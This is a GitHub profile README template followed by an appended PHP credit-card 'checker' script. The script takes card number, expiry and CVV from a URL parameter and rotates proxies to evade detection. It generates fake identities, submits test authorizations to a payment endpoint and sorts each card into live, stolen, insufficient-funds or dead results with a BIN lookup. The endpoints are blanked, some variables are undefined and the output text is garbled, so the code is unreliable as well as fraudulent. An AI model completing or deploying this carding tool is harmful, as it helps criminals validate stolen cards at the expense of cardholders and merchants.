- 👋 Hi, I’m @Dolceka230
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
Dolceka230/Dolceka230 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Zone Details]

$username = ' Your Zone Username';
$password = 'zone password';
///$port = zone port;
$session = mt_rand();
$super_proxy = 'Zone url';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept:  ',
'accept-encoding:   ', 
'content-type:  ',
'origin:  ',
'referer:  ',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '  ');

 $result = curl_exec($ch);
 $token = trim(strip_tags(getStr($result1,'"id": "','"')));


//////2req 
$ch = curl_init();
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); 
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
///'Host: ',
  'Origin: ',
  'Accept-Encoding: ',
  'Referer: ',
  'content-type: ',
  'Cookie: ',
  'accept: ',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: same-origin',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,' ');
  $result2 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result2,'"message":"','"')));

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV - Incorrect Zip)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV - Incorrect Zip_ð½ððððð â)ã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãFraudulent Card_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (ÍCVV)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãInsufficient Funds_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãInsufficient Funds_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãLost Card_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãStolen Card_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (CCN)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (CCN)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãApproved (CCN)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Approved</span> â </span> </span> <span class="badge badge-success">'.$lista.'</span> â <span class="badge badge-info"> ãPickup Card (Reported Stolen Or Lost)_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãExpired Card_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãExpired Card_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãIncorrect Card Number_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãIncorrect Card Number_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãService Not Allowed_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãDeclined : Do_Not_Honor_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCard Declined_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãDeclined : Generic_Decline_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCVC_Check : Unavailable_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCVC_Unchecked : Proxy Error_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCVC_Unchecked : Fail_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">ãDeclinedã</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãDeclined : Missing Card Details_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">#Declined</span> â </span> </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãAnother Request In Process : Card Not Checked_ð½ððððð âã</span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCard Doesnt Support Purchase_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCard Doesnt Support Purchase_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãCard Doesnt Support Purchase_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ã3D Secure Redirect_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãMissing Payment Informations_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãMissing Credit Card Number_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> â </span> <span class="badge badge-danger">'.$lista.'</span> â <span class="badge badge-info"> ãDead Proxy/Error Not listed_ð½ððððð âã </span> â</span> <span class="badge badge-info"> ã '.$bank.' ('.$country.') - '.$type.' ã </span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\

?>
